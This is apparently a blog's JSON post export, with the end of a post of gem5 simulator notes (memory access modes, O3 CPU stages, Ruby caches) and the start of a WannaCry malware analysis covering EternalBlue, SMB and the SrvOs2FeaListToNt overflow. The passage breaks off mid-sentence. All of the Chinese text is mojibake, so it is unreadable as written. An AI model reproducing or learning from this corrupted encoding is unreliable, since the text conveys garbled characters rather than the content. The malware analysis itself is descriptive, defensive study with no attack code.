åŸå­è®¿é—®-åŸå­è®¿é—®æ¯”è¯¦ç»†è®¿é—®è¦å¿«ã€‚å®ƒä»¬ç”¨äºå¿«é€Ÿè½¬å‘å’Œé¢„çƒ­ç¼“å­˜ï¼Œå¹¶è¿”å›å¤§çº¦æ—¶é—´æ¥å®Œæˆè¯·æ±‚ï¼Œè€Œä¸ä¼šå¼•èµ·ä»»ä½•èµ„æºäº‰ç”¨æˆ–æ’é˜Ÿå»¶è¿Ÿã€‚å‘é€åŸå­è®¿é—®åï¼Œå°†åœ¨å‡½æ•°è¿”å›æ—¶æä¾›å“åº”ã€‚åŸå­å’Œå®šæ—¶è®¿é—®ä¸èƒ½åœ¨å†…å­˜ç³»ç»Ÿä¸­å…±å­˜ã€‚ åŠŸèƒ½æ€§-ä¸åŸå­æ€§è®¿é—®ä¸€æ ·ï¼ŒåŠŸèƒ½æ€§è®¿é—®æ˜¯ç¬é—´å‘ç”Ÿçš„ï¼Œä½†æ˜¯ä¸åŸå­æ€§è®¿é—®ä¸åŒï¼Œå®ƒä»¬å¯ä»¥ä¸åŸå­æ€§æˆ–å®šæ—¶è®¿é—®å…±å­˜äºå­˜å‚¨ç³»ç»Ÿä¸­ã€‚åŠŸèƒ½æ€§è®¿é—®ç”¨äºè¯¸å¦‚åŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ£€æŸ¥/æ›´æ”¹æ¨¡æ‹Ÿç³»ç»Ÿä¸­çš„å˜é‡ä»¥åŠå…è®¸å°†è¿œç¨‹è°ƒè¯•å™¨é™„åŠ åˆ°æ¨¡æ‹Ÿå™¨ä¹‹ç±»çš„äº‹æƒ…ã€‚é‡è¦è¯´æ˜æ˜¯è®¾å¤‡æ¥æ”¶åˆ°åŠŸèƒ½è®¿é—®æ—¶ï¼Œå¦‚æœå®ƒåŒ…å«ä¸€ä¸ªæ•°æ®åŒ…é˜Ÿåˆ—ï¼Œåˆ™å¿…é¡»åœ¨æ‰€æœ‰æ•°æ®åŒ…ä¸­æœç´¢è¯¥åŠŸèƒ½è®¿é—®æ­£åœ¨æ‰§è¡Œçš„è¯·æ±‚æˆ–å“åº”ï¼Œå¹¶ä¸”å¿…é¡»å¯¹å…¶è¿›è¡Œé€‚å½“æ›´æ–°ã€‚è¯¥Packet::intersect()å’ŒfixPacket()æ–¹æ³•å¯ä»¥å¸®åŠ©è¿™ä¸€ç‚¹ã€‚ O3 CpuFetchï¼šåœ¨æ¯ä¸ªå‘¨æœŸè·å–æŒ‡ä»¤ï¼Œå¹¶æ ¹æ®æ‰€é€‰ç­–ç•¥é€‰æ‹©è¦ä»å“ªä¸ªçº¿ç¨‹è·å–ä¿¡æ¯ã€‚åœ¨æ­¤é˜¶æ®µï¼Œé¦–å…ˆåˆ›å»ºDynInstã€‚è¿˜å¤„ç†åˆ†æ”¯é¢„æµ‹ã€‚ Decode: å¤„ç†PCç›¸å…³çš„æ— æ¡ä»¶åˆ†æ”¯çš„å¤„ç† Renameï¼šåˆ©ç”¨PR File,ä¸¤ç§æƒ…å†µä¼šç»ˆæ­¢ï¼š æ²¡æœ‰è¶³å¤Ÿå¯„å­˜å™¨æ¥é‡å‘½åï¼Œåç»­èµ„æºå·²ç»ç”¨å®Œ(åºåˆ—åŒ–æŒ‡ä»¤ ) IEW ï¼š å°†æŒ‡ä»¤åˆ†æ´¾ç»™æŒ‡ä»¤é˜Ÿåˆ—ï¼Œå‘Šè¯‰æŒ‡ä»¤é˜Ÿåˆ—å‘å‡ºæŒ‡ä»¤ï¼Œæ‰§è¡Œå¹¶å†™å›æŒ‡ä»¤ Commit: å¤„ç†æŒ‡ä»¤å¯èƒ½å¼•èµ·çš„ä»»ä½•æ•…éšœã€‚è¿˜å¯ä»¥åœ¨åˆ†æ”¯é¢„æµ‹é”™è¯¯çš„æƒ…å†µä¸‹å¤„ç†é‡å®šå‘å‰ç«¯ã€‚ E in E : æœ€åæ‰§è¡Œå­˜åœ¨æ½œåœ¨çš„é”™è¯¯ï¼Œè¿™äº›é”™è¯¯ä¸ä¼šåœ¨ç¨‹åºç»“æœä¸­æ˜¾ç¤ºã€‚å…¶æ¬¡ï¼Œé€šè¿‡åœ¨æµæ°´çº¿çš„å¼€å§‹æ‰§è¡Œï¼ŒæŒ‡ä»¤å…¨éƒ¨æŒ‰é¡ºåºæ‰§è¡Œï¼Œé‚£ä¹ˆä¹±åºçš„load interactionè´Ÿè½½äº¤äº’ä¼šä¸¢å¤±ã€‚æˆ‘ä»¬çš„æ¨¡å‹èƒ½å¤Ÿé¿å…è¿™äº›å› æµæ°´çº¿è®¾è®¡äº§ç”Ÿçš„ä¸è¶³å¹¶æä¾›å‡†ç¡®çš„æ—¶åºæ¨¡å‹ã€‚ Template Policy: åˆ©ç”¨æ¨¡æ¿æ¥å®ç°å¤šæ€æ€§ï¼Œä¸»è¦æ˜¯åˆ©ç”¨ Impl å®šä¹‰ç±»ï¼Œä¼˜ç‚¹æ˜¯ä¸éœ€è¦ä¼ ç»Ÿè™šæ‹Ÿå‡½æ•°/åŸºç±»ã€‚ä¸»è¦ç¼ºç‚¹æ˜¯å¿…é¡»åœ¨ç¼–è¯‘æ—¶å®Œå…¨å®šä¹‰CPUï¼Œå¹¶ä¸”æ¨¡æ¿åŒ–çš„ç±»éœ€è¦æ‰‹åŠ¨å®ä¾‹åŒ–ã€‚ ISA ç‹¬ç«‹æ€§ï¼š å°†ä»£ç åˆ†ä¸º ä¸ ISA æ— å…³å’ŒISAæœ‰å…³çš„ä»£ç ï¼Œæé«˜å¤ç”¨æ€§ åˆ†æ”¯é¢„æµ‹ï¼šåˆ†æ”¯æ˜¯é”™è¯¯æ—¶ï¼Œé€šçŸ¥ commit stage å‹ç¼©ROBå†…ä¸ç”¨çš„ä»£ç  CLassic Memory SystemMOESI: æ•°æ®ä¸€è‡´æ€§åè®® Owned çŠ¶æ€çœä¸€æ¬¡è¯» express snoops: åŸå­çš„ï¼Œèƒ½ç¬é—´è¿”å›ï¼Œåœ¨æ—¶åºæ¨¡å¼ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œé˜²æ­¢æ³›æ´ª cacheï¼š å†…å­˜æ˜ å°„æ•°æ®åŒ…å’Œä¾¦å¬æ•°æ®åŒ…ã€‚å†…å­˜æ˜ å°„çš„è¯·æ±‚åœ¨å†…å­˜å±‚æ¬¡ç»“æ„ä¸­å‘ä¸‹ï¼Œè€Œå“åº”åœ¨å†…å­˜å±‚æ¬¡ç»“æ„ä¸­å‘ä¸Šï¼ˆç›¸åŒçš„è·¯ç”±è¿”å›ï¼‰ã€‚ä¾¦å¬è¯·æ±‚åœ¨ç¼“å­˜å±‚æ¬¡ç»“æ„ä¸­æ²¿æ°´å¹³æ–¹å‘ç§»åŠ¨ï¼Œä¾¦å¬å“åº”åœ¨å±‚æ¬¡ç»“æ„ä¸­æ²¿æ°´å¹³æ–¹å‘å‘ä¸‹ï¼ˆç›¸åŒçš„è·¯ç”±è¿”å›ï¼‰ã€‚æ™®é€šç›‘å¬åœ¨æ°´å¹³æ–¹å‘ä¸Šè¿è¡Œï¼Œè€Œå¿«é€Ÿç›‘å¬åˆ™åœ¨ç¼“å­˜å±‚æ¬¡ç»“æ„ä¸­ã€‚ RubySLICC : ä»£è¡¨ç”¨äºå®ç°ç¼“å­˜ä¸€è‡´æ€§çš„è§„èŒƒè¯­è¨€ã€‚æœ¬è´¨ä¸Šï¼Œç¼“å­˜ä¸€è‡´æ€§åè®®çš„è¡Œä¸ºç±»ä¼¼äºçŠ¶æ€æœºã€‚SLICCç”¨äºæŒ‡å®šçŠ¶æ€æœºçš„è¡Œä¸ºã€‚å¹¶å¯æ–½åŠ æŸç§çº¦æŸã€‚ä¾‹å¦‚ï¼ŒSLICCå¯ä»¥é™åˆ¶å•ä¸ªå¾ªç¯ä¸­å¯èƒ½å‘ç”Ÿçš„è½¬æ¢æ•°é‡ã€‚é™¤äº†åè®®è§„èŒƒå¤–ï¼ŒSLICCè¿˜å°†å†…å­˜æ¨¡å‹ä¸­çš„æŸäº›ç»„ä»¶ç»„åˆåœ¨ä¸€èµ·ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒçŠ¶æ€æœºä»äº’è¿ç½‘ç»œçš„è¾“å…¥ç«¯å£è·å–è¾“å…¥ï¼Œå¹¶åœ¨ç½‘ç»œçš„è¾“å‡ºç«¯å£å°†è¾“å‡ºæ’é˜Ÿï¼Œä»è€Œå°†ç¼“å­˜/å†…å­˜æ§åˆ¶å™¨ä¸äº’è¿ç½‘ç»œæœ¬èº«è¿æ¥åœ¨ä¸€èµ·ã€‚ sequencerï¼š Sequencerç±»è´Ÿè´£å‘å¤„ç†å™¨å­ç³»ç»Ÿï¼ˆåŒ…æ‹¬ç¼“å­˜å’Œç‰‡å¤–å†…å­˜ï¼‰æä¾›æ¥è‡ªå¤„ç†å™¨çš„åŠ è½½/å­˜å‚¨/åŸå­å†…å­˜è¯·æ±‚ã€‚å½“æ¯ä¸ªå†…å­˜è¯·æ±‚ç”±å†…å­˜å­ç³»ç»Ÿå®Œæˆæ—¶ï¼Œä¹Ÿä¼šé€šè¿‡å®šåºå™¨å°†å“åº”å‘é€å›å¤„ç†å™¨ã€‚ç³»ç»Ÿä¸­æ¨¡æ‹Ÿçš„æ¯ä¸ªç¡¬ä»¶çº¿ç¨‹ï¼ˆæˆ–å†…æ ¸ï¼‰éƒ½æœ‰ä¸€ä¸ªå®šåºå™¨ Replacement Policiesï¼š LRU å’Œ Pseudo-LRU TOPAZ -è¯¥æ¨¡æ‹Ÿå™¨å·²å‡†å¤‡å¥½åœ¨gem5ä¸­è¿è¡Œï¼Œå¹¶åœ¨åŸå§‹çš„rubyç½‘ç»œæ¨¡æ‹Ÿå™¨ä¸Šæ·»åŠ äº†å¤§é‡åŠŸèƒ½ã€‚","link":"","tags":[{"name":"sim","slug":"sim","permalink":"https://dingiso.github.io/tags/sim/"},{"name":"gem5","slug":"gem5","permalink":"https://dingiso.github.io/tags/gem5/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"}]},{"title":"WannaCry çš„å…·ä½“çš„ç»†èŠ‚çš„åˆ†æ","date":"2020-12-30T00:05:34.000Z","path":"2020/12/30/Wannacry ç—…æ¯’åˆ†æ/","text":"æœ¬æ–‡æ˜¯é’ˆå¯¹WannaCry çš„å…·ä½“çš„ç»†èŠ‚çš„åˆ†æ REFERENCE WannaCry ç—…æ¯’åˆ†æVirus Analysis Of WannaCry[TOC] å¼• è¨€æœ¬æ¬¡å¤§ä½œä¸šä¸»è¦å¯¹WannaCryç—…æ¯’çš„è¡Œä¸ºå’Œå…·ä½“ä»£ç çš„å®ç°é€»è¾‘è¿›è¡Œåˆ†æï¼Œä¹‹å‰æœ‰ä¸€äº›å‰è¾ˆå·²ç»å¯¹ç—…æ¯’å¤§ä½“æƒ…å†µåšå‡ºäº†ç›¸å…³çš„åˆ†æã€‚æœ¬æ¬¡å¤§ä½œä¸šå°†ä¼šåˆ©ç”¨ç°æœ‰èƒ½æ‰¾åˆ°çš„å‰äººçš„æ‰€æœ‰åˆ†æè¿›è¡Œæ±‡æ€»ç»†åŒ–ï¼Œå¹¶ç»“åˆè‡³ä»Šä¸ºæ­¢ç—…æ¯’çš„å˜ç§æƒ…å†µï¼Œè¿›è¡Œé’ˆå¯¹äº‹å®ä¸ç°é‡‘æƒ…å†µçš„é€»è¾‘ï¼Œå˜ç§å’Œé˜²èŒƒæ–¹æ³•åˆ†æï¼Œé€šè¿‡ä¾ç…§äº‹å®çš„åˆ†æï¼Œè§£ç­”å¤§å®¶å¯¹ç—…æ¯’çš„ç–‘é—®å’Œè¯¯è§£ æœ¬æ¬¡å¤§ä½œä¸šçš„äº®ç‚¹åœ¨äºï¼š é€šè¿‡äº†ç—…æ¯’å‘ä½œåˆ°ç°åœ¨çš„æ²‰æ·€ï¼Œç—…æ¯’çš„å…·ä½“è¡Œä¸ºå’Œå˜ç§ä¹Ÿç»è¿‡äº†å‘å±•å’Œæ²‰æ·€ï¼Œé€šè¿‡ç»¼åˆèƒ½å¾—åˆ°æ›´é€‚åˆç°åœ¨çš„æ–¹æ³• é€šè¿‡å¯¹ç—…æ¯’å˜ç§çš„åˆ†æï¼Œåˆ†æç—…æ¯’çš„æ¼”å˜æƒ…å†µï¼Œäº†è§£ç—…æ¯’åœ¨å‘ä½œä¹‹åå¯èƒ½ä¼šæœ‰ä»€ä¹ˆæ ·çš„æ”¹å˜ é€šè¿‡åŸºäºäº‹å®çš„æ¨æµ‹ï¼Œæ¨ç¿»å¤§ä¼—å¯¹ç—…æ¯’è¯¯è§£ï¼Œå¯¹ç—…æ¯’æœ‰åŸºäºç§‘å­¦çš„è®¤è¯†ã€‚ 1 ç—…æ¯’æ¦‚å†µ2017å¹´5æœˆ12æ—¥ï¼Œæœ¬æ–‡æ‰€åˆ†æçš„å‹’ç´¢ç—…æ¯’WannaCryå€ŸåŠ©é«˜å±æ¼æ´â€æ°¸æ’ä¹‹è“â€ï¼ˆEternalBlueï¼‰åœ¨å…¨ä¸–ç•ŒèŒƒå›´å†…å¿«é€Ÿä¼ æ’­ã€‚ä¸–ç•ŒèŒƒå›´å†…çš„å¾ˆå¤šå›½å®¶ï¼ŒåŒ…æ‹¬ä¿„ç½—æ–¯ã€è¥¿ç­ç‰™ã€æ„å¤§åˆ©ã€è¶Šå—ã€ç¾å›½ã€è‹±å›½ã€ä¸­å›½ã€ç­‰ç™¾ä½™ä¸ªå›½å®¶çš„ä¼ä¸šå’ŒåŒ»é™¢ç­‰æœºæ„æ”¶åˆ°å¤§å¹…åº¦çš„ç ´ç¯ã€‚ä¸æ­¤åŒæ—¶ï¼Œæˆ‘å›½çš„è®¸å¤šè¡Œä¸šæœºæ„å’Œå¤§å‹ä¼ä¸šä¹Ÿè¢«æ”»å‡»ï¼Œæœ‰çš„å•ä½ç”šè‡³â€å…¨å†›è¦†æ²¡â€ï¼Œé€ æˆäº†è¿‘æœŸç½•è§çš„æŸå¤±ã€‚ æœ¬æŠ¥å‘Šå°†ä»ä¼ æ’­é€”å¾„ã€å±å®³æ–¹å¼å’Œç»“æœã€å—å¨èƒç”¨æˆ·ç¾¤ç­‰è§’åº¦ï¼Œé€ä¸€å˜æ¸…è¿™ä¸ªæ¶æ€§ç—…æ¯’æ–¹æ–¹é¢é¢çš„çœŸç›¸ï¼Œç”¨ä»¥å¸®åŠ©å¤§å®¶è®¤è¯†ã€è§£å†³è¯¥ç—…æ¯’ï¼Œé˜²èŒƒæœªæ¥å¯èƒ½å‡ºç°çš„å˜ç§ç—…æ¯’ï¼ŒåŒæ—¶æ¾„æ¸…ä¸€äº›è°£ä¼ å’Œè°è¨€ã€‚ 1.1 ç—…æ¯’æ”»å‡»è¡Œä¸ºåŠå±å®³é­å—WannaCryç—…æ¯’ä¾µå®³çš„ç”µè„‘ï¼Œå…¶æ–‡ä»¶å°†è¢«åŠ å¯†é”æ­»ï¼Œç—…æ¯’å¼€å‘è€…æä¾›äº†ä¸€ä¸ªæ¯”ç‰¹å¸è´¦å·ä¾›æ”¯ä»˜èµé‡‘æ‰“å¼€é”æ­»çš„æ–‡ä»¶ï¼Œä½†æ ¹æ®ç—…æ¯’æºç çš„åˆ†æï¼Œå—å®³è€…å¯èƒ½æ°¸è¿œçš„å¤±å»äº†è¿™äº›æ–‡ä»¶ã€‚WannaCryç—…æ¯’çš„è®¾è®¡å°±æ˜ç¡®çš„è¡¨æ˜äº†ç—…æ¯’å’Œç—…æ¯’ä½œè€…ä¸èƒ½å¾—çŸ¥å—å®³è€…æ˜¯å¦æ”¯ä»˜çš„äº†èµé‡‘ï¼Œä¸”ç—…æ¯’å¹¶ä¸åŒ…å«ç”¨äºè§£ç çš„ç¥å¥‡æ•°ï¼Œæ‰€ä»¥å³ä½¿æ”¯ä»˜äº†èµé‡‘ï¼Œå¤§æ¦‚ç‡ä¹Ÿä¸èƒ½å¾—åˆ°æ¢å¤å¯†é’¥ ç½‘ä¸Šæµä¼ çš„â€è§£å¯†æ–¹æ³•â€åªæ˜¯â€æ–‡ä»¶æ¢å¤å·¥å…·â€ï¼Œå¯ä»¥æ¢å¤ä¸€äº›è¢«åˆ é™¤çš„æ–‡ä»¶ï¼Œä½†æ˜¯ä½œç”¨æœ‰é™ã€‚è¿™æ˜¯å› ä¸ºæ®ç—…æ¯’æºç åˆ†æï¼Œæ–‡ä»¶çš„åŠ å¯†è¿‡ç¨‹æ˜¯åŠ å¯†åå†åˆ é™¤åŸå§‹æ–‡ä»¶ï¼Œæ–‡ä»¶æ¢å¤å·¥å…·å¯èƒ½å¯ä»¥æ¢å¤åˆ é™¤çš„åŸå§‹æ–‡ä»¶ã€‚ä½†æ˜¯ç—…æ¯’å¯¹äºæ–‡ä»¶çš„æ“ä½œæ˜¯ååˆ†é¢‘ç¹çš„ï¼Œåˆ é™¤æ–‡ä»¶æ‰€ä¿å­˜çš„æ•°æ®å—å¯èƒ½ä¼šè¢«è¦†ç›–ï¼Œè€Œä¸”éšç€ç—…æ¯’æ‰§è¡Œæ—¶é—´çš„å¢åŠ ï¼Œæ¢å¤çš„å¯èƒ½æ€§ä¼šé€æ¸é™ä½ã€‚ 1.2 ä¼ æ’­é€”å¾„å’Œæ”»å‡»æ–¹å¼WannaCryç”±è •è™«+å‹’ç´¢ç—…æ¯’æ„æˆï¼Œè •è™«ä¼ æ’­å’Œé‡Šæ”¾è‡ªå·±ï¼Œåè€…è´Ÿè´£åŠ å¯†æ–‡ä»¶ã€‚ è •è™«ï¼šè •è™«ç—…æ¯’æ˜¯ä¸€ç§å¸¸è§çš„è®¡ç®—æœºç—…æ¯’ã€‚é€šè¿‡ç½‘ç»œå’Œç”µå­é‚®ä»¶è¿›è¡Œä¼ æ’­ï¼Œå…·æœ‰è‡ªæˆ‘å¤åˆ¶å’Œä¼ æ’­è¿…é€Ÿç­‰ç‰¹ç‚¹ã€‚æ­¤æ¬¡ç—…æ¯’åˆ¶é€ è€…æ­£æ˜¯åˆ©ç”¨äº†ç¾å›½å›½å®¶å®‰å…¨å±€(NSA)æ³„æ¼çš„WindowsSMBè¿œç¨‹æ¼æ´åˆ©ç”¨å·¥å…·â€æ°¸æ’ä¹‹è“â€æ¥è¿›è¡Œä¼ æ’­çš„ã€‚æ®æ‚‰ï¼Œè •è™«ä»£ç è¿è¡Œåå…ˆä¼šè¿æ¥åŸŸåï¼šhxxp: //www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.comå¦‚æœè¯¥åŸŸåå¯ä»¥æˆåŠŸè¿æ¥ï¼Œåˆ™ç›´æ¥åœæ­¢ã€‚è€Œå¦‚æœä¸Šè¿°åŸŸåæ— æ³•è®¿é—®ï¼Œåˆ™ä¼šå®‰è£…ç—…æ¯’æœåŠ¡ï¼Œåœ¨å±€åŸŸç½‘ä¸å¤–ç½‘è¿›è¡Œä¼ æ’­ã€‚ ä½†æ˜¯æ— è®ºè¿™ä¸ªâ€ç¥å¥‡å¼€å…³â€æ˜¯å¦å¼€å¯ï¼Œè¯¥ç—…æ¯’éƒ½ä¼šæ”»å‡»ç”¨æˆ·ï¼Œé”æ­»æ–‡ä»¶ã€‚å¦å¤–ï¼Œè¿™ä¸ªå¼€å…³ç¨‹åºå¾ˆå®¹æ˜“è¢«ç—…æ¯’åˆ¶é€ è€…å»é™¤ï¼Œå› æ­¤æœªæ¥å¯èƒ½å‡ºç°æ²¡æœ‰å¼€å…³çš„å˜ç§ç—…æ¯’ã€‚ 1.3 æ˜“å—æ”»å‡»ç”¨æˆ·ç¾¤å¤§å‹ä¼ä¸šå’Œå…¬å…±è®¾æ–½å æ”¶åˆ°æ”»å‡»çš„ä¸»æœºçš„å¤§å¤šæ•°ï¼Œä¸ªäººç”¨æˆ·å—æ”»å‡»è¾ƒå°‘ã€‚æ¥ä¸‹æ¥ï¼Œå°†ä»ä¸¤ä¸ªæ–¹é¢è¯´æ˜æ˜“å—æ”»å‡»ç”¨æˆ·ç¾¤çš„ç‰¹ç‚¹ æ“ä½œç³»ç»Ÿï¼šé¦–å…ˆï¼Œè¯¥ç—…æ¯’åªæ”»å‡»Windowsç³»ç»Ÿçš„ç”µè„‘ï¼Œå‡ ä¹æ‰€æœ‰çš„Windowsç³»ç»Ÿå¦‚æœæ²¡æœ‰æ‰“è¡¥ä¸ï¼Œéƒ½ä¼šè¢«æ”»å‡»ã€‚è€ŒWindowsVistaã€Windows Server 2008ã€Windows 7ã€Windows Server 2008 R2ã€Windows8.1ã€Windows Server 2012ã€Windows Server 2012 R2ã€Windows Server 2016ç‰ˆæœ¬ï¼Œç”¨æˆ·å¦‚æœå¼€å¯äº†è‡ªåŠ¨æ›´æ–°æˆ–å®‰è£…äº†å¯¹åº”çš„æ›´æ–°è¡¥ä¸ï¼Œå¯ä»¥æŠµå¾¡è¯¥ç—…æ¯’ã€‚Windows10æ˜¯æœ€å®‰å…¨çš„ï¼Œç”±äºå…¶ç³»ç»Ÿæ˜¯é»˜è®¤å¼€å¯è‡ªåŠ¨æ›´æ–°çš„ï¼Œæ‰€ä»¥ä¸ä¼šå—è¯¥ç—…æ¯’å½±å“ã€‚åŒæ—¶ï¼ŒUnixã€Linuxã€Androidç­‰æ“ä½œç³»ç»Ÿï¼Œä¹Ÿä¸ä¼šå—åˆ°æ”»å‡»ã€‚ ç½‘ç»œç»“æ„ï¼šç›®å‰è¿™ä¸ªç—…æ¯’é€šè¿‡å…±äº«ç«¯å£ä¼ æ’­åŒæ—¶åœ¨å…¬ç½‘åŠå†…ç½‘è¿›è¡Œä¼ æ’­ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘ä¸Šä¸”æ²¡æœ‰å®‰è£…ç›¸åº”æ“ä½œç³»ç»Ÿè¡¥ä¸çš„è®¡ç®—æœºæœ‰æå¤§é£é™©ä¼šè¢«æ„ŸæŸ“ï¼Œè€Œé€šè¿‡è·¯ç”±æ‹¨å·çš„ä¸ªäººå’Œä¼ä¸šç”¨æˆ·ï¼Œåˆ™ä¸ä¼šå—åˆ°æ¥è‡ªå…¬ç½‘çš„ç›´æ¥æ”»å‡» 2 æ°¸æ’ä¹‹è“æ¼æ´2.1 æ¼æ´æƒ…å†µè¯´æ˜2.1.1 æ¼æ´ç®€ä»‹æ°¸æ’ä¹‹è“æ¼æ´æ˜¯ä¸€ç§åˆ©ç”¨Windowsç³»ç»Ÿçš„SMBåè®®æ¼æ´æ¥è·å–ç³»ç»Ÿçš„æœ€é«˜æƒé™ï¼Œä»¥æ­¤æ¥æ§åˆ¶è¢«å…¥ä¾µçš„è®¡ç®—æœºçš„ç³»ç»Ÿæ¼æ´ æ¼æ´ä»£ç ï¼š MS17-010 2.1.2 æ¼æ´å½±å“2017å¹´4æœˆ14æ—¥æ™šï¼Œå½±å­ç»çºªäººé»‘å®¢ç»„ç»‡å°†æ°¸æ’ä¹‹è“æ¼æ´åœ¨äº’è”ç½‘ä¸Šå…¬å¼€åã€‚åœ¨ä¹‹åçš„äº”ä¸ªæœˆä¸­ï¼Œè¯¥æ¼æ´è¢«å¤šæ¬¾æ¶æ„è½¯ä»¶åˆ©ç”¨ã€‚åŒ…æ‹¬WannaCryï¼Œæ— æ–‡ä»¶çš„å‹’ç´¢è½¯ä»¶UIWIXå’ŒSMBè •è™«EternalRocksã€‚ EternalBlue(åœ¨å¾®è½¯çš„MS17-010ä¸­è¢«ä¿®å¤)æ˜¯åœ¨Windowsçš„SMBæœåŠ¡å¤„ç†SMBv1è¯·æ±‚æ—¶å‘ç”Ÿçš„æ¼æ´ï¼Œè¿™ä¸ªæ¼æ´å¯¼è‡´æ”»å‡»è€…åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚ 2.2 SMBåè®®2.2.1 ç®€ä»‹SMBï¼ˆå…¨ç§°æ˜¯Server MessageBlockï¼‰æ˜¯ä¸€ä¸ªåè®®æœåŠ¡å™¨ä¿¡æ¯å—ï¼Œå®ƒæ˜¯ä¸€ç§å®¢æˆ·æœº/æœåŠ¡å™¨ã€è¯·æ±‚/å“åº”åè®®ï¼Œé€šè¿‡SMBåè®®å¯ä»¥åœ¨è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€å‘½åç®¡é“ç­‰èµ„æºï¼Œç”µè„‘ä¸Šçš„ç½‘ä¸Šé‚»å±…å°±æ˜¯é SMBå®ç°çš„ï¼›SMBåè®®å·¥ä½œåœ¨åº”ç”¨å±‚å’Œä¼šè¯å±‚ï¼Œå¯ä»¥ç”¨åœ¨TCP/IPåè®®ä¹‹ä¸Šï¼ŒSMBä½¿ç”¨TCP139ç«¯å£å’ŒTCP445ç«¯å£ã€‚ 2.2.2 å·¥ä½œåŸç†ï¼ˆ1ï¼‰ï¼šé¦–å…ˆå®¢æˆ·ç«¯å‘é€ä¸€ä¸ªSMB negportè¯·æ±‚æ•°æ®æŠ¥ï¼Œï¼Œå¹¶åˆ—å‡ºå®ƒæ‰€æ”¯æŒçš„æ‰€æœ‰SMBçš„åè®®ç‰ˆæœ¬ã€‚æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚æ¶ˆæ¯åå“åº”è¯·æ±‚ï¼Œå¹¶åˆ—å‡ºå¸Œæœ›ä½¿ç”¨çš„SMBåè®®ç‰ˆæœ¬ã€‚å¦‚æœæ²¡æœ‰å¯ä»¥ä½¿ç”¨çš„åè®®ç‰ˆæœ¬åˆ™è¿”å›0XFFFFHï¼Œç»“æŸé€šä¿¡ã€‚ ï¼ˆ2ï¼‰ï¼šåè®®ç¡®å®šåï¼Œå®¢æˆ·ç«¯è¿›ç¨‹å‘æœåŠ¡å™¨å‘èµ·ä¸€ä¸ªç”¨æˆ·æˆ–å…±äº«çš„è®¤è¯ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯é€šè¿‡å‘é€SessetupXè¯·æ±‚æ•°æ®åŒ…å®ç°çš„ã€‚å®¢æˆ·ç«¯å‘é€ä¸€å¯¹ç”¨æˆ·åå’Œå¯†ç æˆ–ä¸€ä¸ªç®€å•å¯†ç åˆ°æœåŠ¡å™¨ï¼Œç„¶åé€šè¿‡æœåŠ¡å™¨å‘é€ä¸€ä¸ªSessetupXåº”ç­”æ•°æ®åŒ…æ¥å…è®¸æˆ–æ‹’ç»æœ¬æ¬¡è¿æ¥ ï¼ˆ3ï¼‰ï¼šå½“å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å®Œæˆäº†ç£‹å•†å’Œè®¤è¯ä¹‹åï¼Œå®ƒä¼šå‘é€ä¸€ä¸ªTconæˆ–TconXSMBæ•°æ®æŠ¥å¹¶åˆ—å‡ºå®ƒæƒ³è®¿é—®çš„ç½‘ç»œèµ„æºçš„åç§°ï¼Œä¹‹åä¼šå‘é€ä¸€ä¸ªTconXåº”ç­”æ•°æ®æŠ¥ä»¥è¡¨ç¤ºæ­¤æ¬¡è¿æ¥æ˜¯å¦æ¥æ”¶æˆ–æ‹’ç»ã€‚ ï¼ˆ4ï¼‰ï¼šè¿æ¥åˆ°ç›¸åº”èµ„æºåï¼ŒSMBå®¢æˆ·ç«¯å°±èƒ½å¤Ÿé€šè¿‡openSMBæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œé€šè¿‡read SMBè¯»å–æ–‡ä»¶ï¼Œé€šè¿‡write SMBå†™å…¥æ–‡ä»¶ï¼Œé€šè¿‡closeSMBå…³é—­æ–‡ä»¶ã€‚ 2.3 æº¢å‡ºåˆ†æ2.3.1 æ¦‚è¿°æ¼æ´å‡ºç°åœ¨Windows SMB v1ä¸­çš„å†…æ ¸æ€å‡½æ•°srv!SrvOs2FeaListToNtåœ¨å¤„ç†FEA(File Extended Attributes)è½¬æ¢æ—¶ï¼Œåœ¨å¤§éåˆ†é¡µæ± (å†…æ ¸çš„æ•°æ®ç»“æ„ï¼ŒLarge Non-Paged Kernel Pool)ä¸Šå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºã€‚å‡½æ•°srv!SrvOs2FeaListToNtåœ¨å°†FEA listè½¬æ¢æˆNTFEA(Windows NT FEA) listå‰ä¼šè°ƒç”¨srv!SrvOs2FeaListSizeToNtå»è®¡ç®—è½¬æ¢åçš„FEA lsitçš„å¤§å°ã€‚ç„¶åä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š 1.srv!SrvOs2FeaListSizeToNtä¼šè®¡ç®—FEA listçš„å¤§å°å¹¶æ›´æ–°å¾…è½¬æ¢çš„FEA listçš„å¤§å° 2.å› ä¸ºé”™è¯¯çš„ä½¿ç”¨WORDå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œå¯¼è‡´è®¡ç®—å‡ºæ¥çš„å¾…è½¬æ¢çš„FEA listçš„å¤§å°æ¯”çœŸæ­£çš„FEA listå¤§ 3.å› ä¸ºåŸå…ˆçš„æ€»å¤§å°è®¡ç®—é”™è¯¯ï¼Œå¯¼è‡´å½“FEA listè¢«è½¬åŒ–ä¸ºNTFEA listæ—¶ï¼Œä¼šåœ¨éåˆ†é¡µæ± å¯¼è‡´ç¼“å†²åŒºæº¢å‡º 2.4 æ¼æ´çš„åˆ©ç”¨2.4.1 æƒ…å†µè¯´æ˜æ¼æ´ä»£ç å·¥ä½œåœ¨å†…æ ¸çš„éåˆ†é¡µå†…å­˜ä¸­ã€‚ä¹Ÿå¯ä»¥å·¥ä½œåœ¨å¤§éåˆ†é¡µæ± ä¸­ã€‚è¿™äº›ç±»å‹çš„æ± éƒ½æ²¡æœ‰åœ¨é¡µçš„å¼€å§‹åµŒå…¥ä»»ä½•å¤´éƒ¨ã€‚å› 